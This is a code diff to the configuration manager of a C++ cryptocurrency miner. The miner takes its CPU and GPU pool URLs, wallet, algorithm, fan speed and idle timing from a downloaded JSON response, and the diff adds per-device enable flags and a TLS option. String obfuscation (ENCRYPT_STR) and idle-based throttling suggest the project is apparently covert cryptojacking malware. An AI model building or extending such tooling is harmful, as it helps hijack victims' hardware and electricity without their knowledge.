@@ -135,21 +135,35 @@ void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
             cpuConfig.use_ssl = cpuJson.value("use_ssl", 0);
         }
 
+        // Parse enable_cpu flag
+        if (jsonResponse.contains("enable_cpu")) {
+            cpuConfig.enabled = jsonResponse.value("enable_cpu", 1);
+        } else {
+            cpuConfig.enabled = 1;  // Default enabled
+        }
+
         // Parse GPU config
         if (jsonResponse.contains("gpu_config") && !jsonResponse["gpu_config"].is_null()) {
             json gpuJson = jsonResponse["gpu_config"];
             gpuConfig.mining_url = gpuJson.value("mining_url", "");
             gpuConfig.wallet = gpuJson.value("wallet", "");
             gpuConfig.password = gpuJson.value("password", "");
-            gpuConfig.non_idle_usage = gpuJson.value("non_idle_usage", 50.0);
-            gpuConfig.idle_usage = gpuJson.value("idle_usage", 100.0);
+            gpuConfig.algo = gpuJson.value("algo", "kawpow");
+            gpuConfig.fan_speed = gpuJson.value("fan_speed", 80);
             gpuConfig.wait_time_idle = gpuJson.value("wait_time_idle", 300);
             gpuConfig.use_ssl = gpuJson.value("use_ssl", 0);
         }
 
+        // Parse enable_gpu flag
+        if (jsonResponse.contains("enable_gpu")) {
+            gpuConfig.enabled = jsonResponse.value("enable_gpu", 1);
+        } else {
+            gpuConfig.enabled = 1;  // Default enabled
+        }
+
         std::cout << "[+] Configuration loaded successfully" << std::endl;
-        std::cout << "    CPU Mining URL: " << cpuConfig.mining_url << " (SSL: " << cpuConfig.use_ssl << ")" << std::endl;
-        std::cout << "    GPU Mining URL: " << gpuConfig.mining_url << " (SSL: " << gpuConfig.use_ssl << ")" << std::endl;
+        std::cout << "    CPU Mining URL: " << cpuConfig.mining_url << " (SSL: " << cpuConfig.use_ssl << ", Enabled: " << cpuConfig.enabled << ")" << std::endl;
+        std::cout << "    GPU Mining URL: " << gpuConfig.mining_url << " (SSL: " << gpuConfig.use_ssl << ", Enabled: " << gpuConfig.enabled << ")" << std::endl;
     }
     catch (const std::exception& e) {
         std::cerr << "[-] Error parsing config: " << e.what() << std::endl;
@@ -178,8 +192,8 @@ std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool 
         args += password + " ";
     }
     
-    // Add TLS flag if indicated in password field
-    if (config.password.find("--tls") != std::string::npos) {
+    // Add TLS flag if use_ssl is enabled or if indicated in password field
+    if (config.use_ssl == 1 || config.password.find("--tls") != std::string::npos) {
         args += ENCRYPT_STR("--tls ");
     }
     
